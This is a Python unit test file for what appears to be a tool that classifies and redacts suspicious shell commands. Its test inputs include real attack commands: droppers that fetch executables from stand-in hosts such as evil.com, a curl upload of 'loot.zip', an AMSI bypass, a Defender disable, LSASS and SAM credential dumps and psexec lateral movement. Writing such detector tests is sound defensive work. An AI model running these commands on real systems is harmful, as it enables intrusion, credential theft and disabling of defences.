"""
Unit tests for analysis depth modules: classifier, parent_score, redactor.

No network or DB required — all pure-Python.
"""

from __future__ import annotations

import base64
import gzip

from app.classifier import classify
from app.parent_score import score_parent
from app.redactor import redact
from app.scoring import compute_verdict


# ---------------------------------------------------------------------------
# redactor
# ---------------------------------------------------------------------------


def test_redact_private_ip():
    cmd = "curl http://192.168.1.100/beacon"
    out, changed = redact(cmd)
    assert changed
    assert "[INTERNAL-IP]" in out
    assert "192.168.1.100" not in out


def test_redact_10_block():
    cmd = "net use \\\\10.0.0.5\\admin$ /user:domain\\user pass"
    out, changed = redact(cmd)
    assert changed
    assert "[INTERNAL-IP]" in out


def test_redact_172_block():
    cmd = "ping 172.16.100.1"
    out, changed = redact(cmd)
    assert changed
    assert "[INTERNAL-IP]" in out


def test_redact_credential_flag():
    cmd = "msbuild /p:password=SuperSecret123"
    out, changed = redact(cmd)
    assert changed
    assert "[REDACTED]" in out
    assert "SuperSecret123" not in out


def test_redact_ntlm_hash():
    cmd = "pass-the-hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
    out, changed = redact(cmd)
    assert changed
    assert "[NTLM-HASH]" in out


def test_redact_clean_command():
    cmd = "ls -la /tmp"
    out, changed = redact(cmd)
    assert not changed
    assert out == cmd


def test_redact_preserves_base64_blob():
    # Base64 encoded command should NOT be redacted
    b64 = base64.b64encode(b"Write-Host 'hello'").decode()
    cmd = f"powershell -EncodedCommand {b64}"
    out, changed = redact(cmd)
    assert not changed
    assert b64 in out


# ── GAP 2: internal hostnames, broadened credentials, IPv6, PEM ──────────────

def test_redact_internal_dns_hostname():
    out, changed = redact("sqlcmd -S db01.corp.local -U sa")
    assert changed
    assert "db01.corp.local" not in out
    assert "[INTERNAL-HOST]" in out


def test_redact_unc_path_host():
    out, changed = redact("copy loot.zip \\\\FILESRV01\\share")
    assert changed
    assert "FILESRV01" not in out
    assert "[INTERNAL-HOST]" in out


def test_redact_computername_flag():
    out, changed = redact("Invoke-Command -ComputerName DC01 -ScriptBlock {hostname}")
    assert changed
    assert "DC01" not in out


def test_redact_bearer_token():
    out, changed = redact('curl -H "Authorization: Bearer eyJhbGciOiJIUzI1Niabc123" https://x')
    assert changed
    assert "eyJhbGciOiJIUzI1Niabc123" not in out


def test_redact_aws_access_key():
    out, changed = redact("aws configure set k AKIAIOSFODNN7EXAMPLE")
    assert changed
    assert "AKIAIOSFODNN7EXAMPLE" not in out


def test_redact_securestring_plaintext():
    out, changed = redact("ConvertTo-SecureString -String 'Pl4inT3xt!' -AsPlainText -Force")
    assert changed
    assert "Pl4inT3xt!" not in out


def test_redact_ipv6_private():
    out, changed = redact("ping fe80::1ff:fe23:4567:890a")
    assert changed
    assert "fe80::1ff:fe23:4567:890a" not in out
    assert "[INTERNAL-IP]" in out


def test_redact_pem_private_key():
    cmd = "echo '-----BEGIN RSA PRIVATE KEY-----\nMIIabc123\n-----END RSA PRIVATE KEY-----'"
    out, changed = redact(cmd)
    assert changed
    assert "MIIabc123" not in out
    assert "[REDACTED-KEY]" in out


def test_redact_public_domain_not_masked():
    # A public TLD must NOT be treated as an internal host.
    out, changed = redact("Invoke-WebRequest https://example.com/report.pdf")
    assert not changed


# ── GAP 1: LOLBAS argument similarity ─────────────────────────────────────────

from app.lolbas import load_catalog as _load_lolbas, match as _lolbas_match

_load_lolbas()


def test_lolbas_abuse_pattern_matches_args():
    # Textbook certutil download abuse — args should resemble a known example.
    hit = _lolbas_match("certutil", "certutil -urlcache -split -f http://evil.example/x.exe x.exe")
    assert hit is not None
    assert hit.get("arg_match") is True
    assert hit.get("arg_similarity", 0) >= 0.6


def test_lolbas_benign_dualuse_does_not_match_args():
    # Same binary, legitimate use — args should NOT resemble abuse examples.
    hit = _lolbas_match("certutil", "certutil.exe -hashfile report.pdf SHA256")
    assert hit is not None
    assert hit.get("arg_match") is False


# ── GAP 4: string-obfuscation decoders ────────────────────────────────────────

from app.decoder import decode_layers as _decode


def test_decode_string_concat():
    layers = _decode("$x = 'po'+'wer'+'shell'+'.exe'")
    encodings = [l["encoding"] for l in layers]
    assert "string-concat" in encodings
    assert any("powershell.exe" in l["value"] for l in layers)


def test_decode_format_operator():
    layers = _decode("Invoke-Expression ('{0}{1}{2}' -f 'po','wer','shell')")
    encodings = [l["encoding"] for l in layers]
    assert "format-op" in encodings
    assert any("powershell" in l["value"] for l in layers)


def test_decode_dot_replace():
    layers = _decode("$cmd = 'p?o?w?e?r'.replace('?','')")
    encodings = [l["encoding"] for l in layers]
    assert "dot-replace" in encodings
    assert any("power" in l["value"] for l in layers)


def test_decode_array_reverse():
    layers = _decode("[array]::Reverse([char[]]'llehsrewop')")
    encodings = [l["encoding"] for l in layers]
    assert "array-reverse" in encodings
    assert any("powershell" in l["value"] for l in layers)


def test_decode_two_string_literals_does_not_fire():
    # Only 2 literals joined — too noisy to treat as obfuscation.
    layers = _decode("$x = 'hello' + 'world'")
    assert "string-concat" not in [l["encoding"] for l in layers]


def test_decode_benign_long_literals_does_not_fire():
    # 3 long literals — looks like benign string-building, not obfuscation.
    layers = _decode("$x = 'hello' + 'world' + 'goodbye'")
    assert "string-concat" not in [l["encoding"] for l in layers]


# ── PowerShell backtick obfuscation (screenshot regression) ──────────────────

def test_decode_powershell_backtick_obfuscation():
    cmd = 'p`o`w`e`r`s`h`e`l`l.exe -Command "G`e`t-P`r`o`c`e`s`s"'
    layers = _decode(cmd)
    encodings = [l["encoding"] for l in layers]
    assert "powershell-backtick" in encodings
    assert any("powershell.exe" in l["value"] for l in layers)
    assert any("Get-Process" in l["value"] for l in layers)


def test_decode_backtick_line_continuation_preserved():
    # Line-continuation backticks (followed by newline) are legit PS syntax.
    # The decoder must NOT strip these — only in-token backticks.
    cmd = "Get-Process `\n  | Select-Object Name `\n  | Format-Table"
    layers = _decode(cmd)
    assert "powershell-backtick" not in [l["encoding"] for l in layers]


def test_decode_single_backtick_does_not_fire():
    # A lone `n escape (newline) is not obfuscation; need ≥3 in-token backticks.
    layers = _decode('Write-Host "hello`nworld"')
    assert "powershell-backtick" not in [l["encoding"] for l in layers]


# ── GAP P0 #2 + P1 #3 (audit fixes) ──────────────────────────────────────────

from app.redactor import is_internal_url


def test_is_internal_url_private_ip():
    assert is_internal_url("https://192.168.1.10/path")
    assert is_internal_url("http://10.0.0.5/")
    assert is_internal_url("https://127.0.0.1/")


def test_is_internal_url_internal_dns_suffix():
    assert is_internal_url("https://server.corp.local/")
    assert is_internal_url("https://db01.lan/")
    assert is_internal_url("http://kerberos.ad/")


def test_is_internal_url_single_label_hostname():
    assert is_internal_url("http://fileserver/share")
    assert is_internal_url("http://localhost/")


def test_is_internal_url_public_hostname():
    assert not is_internal_url("https://example.com/")
    assert not is_internal_url("https://github.com/owner/repo")
    assert not is_internal_url("http://8.8.8.8/")


def test_redact_curl_h_header_not_treated_as_host():
    out, changed = redact('curl -h "Content-Type: application/json" https://api.example.com')
    # The header value must survive — -h is not a host flag.
    assert "Content-Type" in out


# ── Story panel: obfuscated-but-no-threat case ───────────────────────────────

from app.story import generate_story


def test_story_acknowledges_obfuscation_when_no_threats():
    # Backtick-obfuscated benign command — no threat classes, no LOLBAS hit,
    # but a decoded layer exists. Paragraph 1 must NOT say "no malicious
    # patterns detected" — that contradicts the Notable verdict.
    result = {
        "threat_classes": [],
        "decoded_layers": [{"encoding": "powershell-backtick", "value": "echo hello"}],
        "lolbas_matches": [],
        "gtfobins_matches": [],
        "loldrivers_match": None,
    }
    story = generate_story(result)
    first_para = story.split("\n\n")[0].lower()
    assert "obfuscat" in first_para
    assert "no malicious behavioral patterns were detected" not in first_para


# ---------------------------------------------------------------------------
# classifier
# ---------------------------------------------------------------------------


def test_classify_dropper_iwr():
    cmd = "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://evil.com/a.exe','a.exe')\""
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "dropper" in names


def test_classify_loader_encodedcommand():
    b64 = base64.b64encode("IEX('calc')".encode("utf-16-le")).decode()
    cmd = f"powershell.exe -EncodedCommand {b64}"
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "loader" in names


def test_classify_defense_evasion_amsi():
    cmd = "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "defense_evasion" in names


def test_classify_credential_theft_lsass():
    cmd = 'procdump.exe -accepteula -ma lsass.exe lsass.dmp'
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "credential_theft" in names


def test_classify_persistence_schtasks():
    cmd = 'schtasks /create /tn "Updater" /tr "powershell -enc JAB..." /sc onlogon /ru system'
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "c2_persistence" in names


def test_classify_lateral_movement_psexec():
    cmd = "psexec \\\\192.168.1.50 -u domain\\admin -p pass cmd /c whoami"
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "lateral_movement" in names


def test_classify_recon():
    cmd = "cmd /c whoami && net user && ipconfig /all"
    classes = classify(cmd, [])
    names = {c.name for c in classes}
    assert "recon" in names


def test_classify_in_decoded_layer():
    # Credential theft indicator hidden in a decoded layer, not the outer command
    decoded_content = "reg save HKLM\\SAM C:\\Windows\\Temp\\s.hive"
    layers = [{"layer": 1, "encoding": "base64", "value": decoded_content}]
    cmd = f"powershell -enc {base64.b64encode(decoded_content.encode()).decode()}"
    classes = classify(cmd, layers)
    names = {c.name for c in classes}
    assert "credential_theft" in names


def test_classify_high_confidence_reported():
    cmd = "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
    classes = classify(cmd, [])
    theft = next((c for c in classes if c.name == "credential_theft"), None)
    assert theft is not None
    assert theft.confidence == "high"


def test_classify_benign_no_classes():
    cmd = "ls -la /tmp"
    classes = classify(cmd, [])
    # Benign ls should not trigger any high-confidence threat classes
    high_conf = [c for c in classes if c.confidence == "high"]
    assert high_conf == []


# ---------------------------------------------------------------------------
# parent_score
# ---------------------------------------------------------------------------


def test_parent_winword_powershell():
    verdict = score_parent("winword.exe", "powershell.exe -enc JAB...")
    assert verdict is not None
    assert verdict.suspicion == "high"
    assert verdict.parent == "winword.exe"
    assert verdict.child == "powershell.exe"


def test_parent_excel_cmd():
    verdict = score_parent("excel.exe", "cmd.exe /c calc")
    assert verdict is not None
    assert verdict.suspicion == "high"


def test_parent_chrome_powershell():
    verdict = score_parent("chrome.exe", "powershell -ep bypass -c iex(...)")
    assert verdict is not None
    assert verdict.suspicion == "high"


def test_parent_office_no_exe_suffix():
    # Should normalize missing .exe suffix
    verdict = score_parent("winword", "cmd /c whoami")
    assert verdict is not None
    assert verdict.suspicion == "high"


def test_parent_benign_explorer_cmd():
    verdict = score_parent("explorer.exe", "cmd.exe")
    assert verdict is not None
    assert verdict.suspicion == "benign"


def test_parent_low_suspicion_cmd_ps():
    verdict = score_parent("cmd.exe", "powershell.exe -NonInteractive")
    assert verdict is not None
    assert verdict.suspicion == "low"


def test_parent_unknown_pair_returns_none():
    verdict = score_parent("notepad.exe", "calc.exe")
    assert verdict is None


def test_parent_no_binary_in_command():
    verdict = score_parent("winword.exe", "")
    assert verdict is None


# ── Masquerade detection (T1036.005) ──────────────────────────────────────────

from app.main import _detect_masquerade


def test_masquerade_detects_svchost_variants():
    for name in ("svchost32", "scvhost", "svch0st", "svhost"):
        assert _detect_masquerade(name) == "svchost", name


def test_masquerade_detects_other_protected_procs():
    assert _detect_masquerade("lsass1") == "lsass"
    assert _detect_masquerade("csrss32") == "csrss"
    assert _detect_masquerade("winlogon1") == "winlogon"


def test_masquerade_ignores_exact_and_legit_names():
    assert _detect_masquerade("svchost") is None      # the real process name
    assert _detect_masquerade("services") is None      # exact protected name
    assert _detect_masquerade("iexplore") is None      # distinct legit binary
    assert _detect_masquerade("explorer") is None


def test_masquerade_no_false_positive_on_short_or_unrelated():
    assert _detect_masquerade("host") is None          # too short
    assert _detect_masquerade("notepad") is None
    assert _detect_masquerade("myapp") is None
    assert _detect_masquerade("certutil") is None


# ── Regression: argument tokens must not be extracted as binaries ─────────────

from app.parser import extract_binaries


def test_extract_binaries_ignores_subcommands_and_args():
    assert extract_binaries("npm install --save-dev typescript eslint") == ["npm"]
    assert extract_binaries("pip install requests flask sqlalchemy") == ["pip"]
    assert extract_binaries("docker run --rm -it nginx:latest") == ["docker"]


def test_extract_binaries_keeps_command_position_tokens():
    # First token + token after a pipe are both real command positions.
    assert extract_binaries("cat /etc/passwd | grep root") == ["cat", "grep"]


def test_extract_binaries_picks_up_extensionless_lolbins():
    # bitsadmin / certutil are invoked without .exe in nearly every real
    # incident report — they MUST be extracted so the LOLBAS panel can fire.
    bins = extract_binaries(
        'bitsadmin /transfer "WindowsUpdate" /download /priority normal '
        'hxxp://update-svc[.]xyz/patch.exe C:\\Windows\\Temp\\patch.exe'
    )
    assert "bitsadmin.exe" in bins
    assert "patch.exe" in bins

    bins = extract_binaries("certutil -urlcache -split -f http://evil.com/p.exe p.exe")
    assert "certutil.exe" in bins


# ── Regression: benign HTTP downloads are not high-confidence droppers ────────

def test_benign_invoke_webrequest_not_malicious():
    cmd = "Invoke-WebRequest -Uri https://example.com/report.pdf -OutFile report.pdf"
    v = compute_verdict(classify(cmd, []))
    assert v["severity"] in ("clean", "low"), v


def test_benign_multiline_downloads_not_malicious():
    cmd = (
        "curl -L -o ubuntu.iso https://releases.ubuntu.com/22.04/ubuntu.iso\n"
        "wget https://nodejs.org/dist/v20.11.0/node-v20.11.0-linux-x64.tar.xz\n"
        "Invoke-WebRequest -Uri https://example.com/report.pdf -OutFile report.pdf"
    )
    v = compute_verdict(classify(cmd, []))
    assert v["severity"] in ("clean", "low"), v


def test_real_droppers_still_malicious():
    for cmd in (
        "Invoke-WebRequest -Uri http://evil.com/a.exe -OutFile a.exe; & a.exe",
        "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://evil.com/a.exe','a.exe')\"",
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
    ):
        v = compute_verdict(classify(cmd, []))
        assert v["severity"] == "malicious", (cmd, v)


# ── P0: lone high-confidence defense_evasion is malicious, not just suspicious ─

def test_lone_amsi_patch_is_malicious():
    cmd = "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\""
    v = compute_verdict(classify(cmd, []))
    assert v["severity"] == "malicious", v


def test_lone_defender_disable_is_malicious():
    cmd = "Set-MpPreference -DisableRealtimeMonitoring $true"
    v = compute_verdict(classify(cmd, []))
    assert v["severity"] == "malicious", v


# ── P1: two benign-but-medium admin classes don't earn the multi-stage bonus ──

def test_benign_admin_medium_combo_not_malicious():
    # Enter-PSSession (lateral, medium) + schtasks /create (c2, medium):
    # routine admin. With medium counted at half, no correlation bonus → not malicious.
    cmd = 'Enter-PSSession -ComputerName SRV01; schtasks /create /tn Job /tr task.bat /sc daily'
    v = compute_verdict(classify(cmd, []))
    assert v["severity"] in ("low", "notable", "suspicious"), v
    assert v["severity"] != "malicious", v


# ── P2: file upload fires standalone; bare POST needs corroboration ───────────

def test_curl_file_upload_is_exfil():
    cmd = 'curl -X POST https://evil.xyz/u -F "file=@C:\\Temp\\loot.zip"'
    classes = {c.name for c in classify(cmd, [])}
    assert "data_staging" in classes


def test_curl_bare_post_to_api_not_flagged():
    cmd = "curl -X POST https://api.internal/v1/events -d '{\"event\":\"login\"}'"
    classes = {c.name for c in classify(cmd, [])}
    assert "data_staging" not in classes


# ── P3a: help/version queries on medium recon rules are suppressed ────────────

def test_nmap_help_not_recon():
    assert classify("nmap --help", []) == []
    assert classify("nltest /?", []) == []
